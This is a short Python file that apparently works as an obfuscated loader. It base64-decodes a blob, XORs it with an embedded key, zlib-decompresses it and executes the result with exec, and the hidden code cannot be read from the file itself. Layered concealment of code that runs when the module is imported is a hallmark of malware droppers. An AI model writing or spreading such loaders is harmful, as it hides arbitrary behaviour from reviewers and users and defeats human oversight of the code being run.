import base64 as _q_b05e289d
import zlib as _z_b05e289d
_k_b05e289d = b'\x17\xecM\x9b\x0f\x8bu\x8b\x1a\xcc\xf0\x14\xda\x16_\x03a*D\xc6\xfb\xb5H\xdb'
_d_b05e289d = bytes(_c_b05e289d ^ _k_b05e289d[_i_b05e289d % len(_k_b05e289d)] for _i_b05e289d, _c_b05e289d in enumerate(_q_b05e289d.b64decode('bzaGVyJDWqFLhLo4lCNsUikGEk7UOX/oItp7qb7Dk0GehKbxvjDepss6FprSHCHR5ik9moJzMcYx4vU08lxyKkzgB5BXItpBi3MWy5vRKSebqExKSI9WS0cPUWKi5kcRQcNg0tw+JVyelmFQnz3nAziqAlw=')))
_d_b05e289d = _z_b05e289d.decompress(_d_b05e289d)
exec(compile(_d_b05e289d, __file__, 'exec'), globals(), globals())
